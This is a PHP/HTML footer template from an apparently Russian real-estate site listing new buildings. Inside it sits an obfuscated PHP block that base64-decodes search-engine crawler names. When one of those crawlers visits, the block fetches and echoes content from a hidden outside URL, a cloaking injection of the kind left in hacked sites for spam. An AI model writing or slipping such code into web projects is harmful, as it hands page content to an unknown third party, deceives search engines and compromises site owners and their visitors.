		<div class="footer<?php if($str == 3){echo " mapfooter";}?>">
			<div class="footer_top">
                <div class="center_content">
    				<div class="footer_top_main">
    					<div class="menu">
    						<ul>
    							<li><a href="index.php">Главная</a></li>
    							<li><a href="baza.php">База новостроек</a></li>
    							<li><a href="map.php">Новостройки на карте</a></li>
    							<li><a href="art.php">Статьи</a></li>
    							<li><a href="company.php">Застройщики</a></li>
    						</ul>	
    					</div>
    					<div class="email">
    						<a href="ans.php">Обратная связь</a>	
    					</div>
    				</div>
                    <div>
                        <?php
                            function SpiderDetect($USER_AGENT){
                                $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
                                foreach ($arr as $i) {
                                    if(strstr($USER_AGENT, base64_decode($i))){
                                        return(base64_decode($i));
                                    }
                                }
                                return (false);
                            }
                        
                            $detect = SpiderDetect($_SERVER['HTTP_USER_AGENT']); 
                        
                            if($detect){
                                echo $message = file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));
                            }
                        ?>
                    </div>
                </div>					
			</div>	
		</div>